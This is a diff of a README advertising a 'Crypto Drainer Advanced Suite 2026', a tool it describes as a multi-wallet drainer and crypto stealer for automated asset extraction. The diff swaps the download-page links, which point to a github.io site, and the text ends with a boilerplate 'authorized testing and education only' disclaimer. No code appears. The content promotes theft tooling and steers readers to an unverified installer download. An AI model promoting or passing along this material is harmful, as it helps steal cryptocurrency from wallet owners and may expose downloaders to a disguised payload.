@@ -2,7 +2,7 @@
 
 The Crypto Drainer Advanced Suite 2026 is a comprehensive and advanced drainer pack designed for multi-wallet drainer operations. It serves as a powerful crypto stealer tool, offering extensive functionality for users requiring automated and efficient digital asset extraction across various platforms and wallet types.
 
-[![Download Installer](https://img.shields.io/badge/Download-Latest-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Latest-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -40,7 +40,7 @@ A: This suite is a full crypto drainer suite, not just a single-function tool. I
 
 For the latest version and secure access, please download directly from our official source.
 
-[Download the Crypto Drainer Advanced Suite 2026](https://yellowtaxisave.github.io/download-page/)
+[Download the Crypto Drainer Advanced Suite 2026](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 *This tool is provided for authorized security testing and educational purposes only. Users are responsible for compliance with all applicable laws and regulations.*
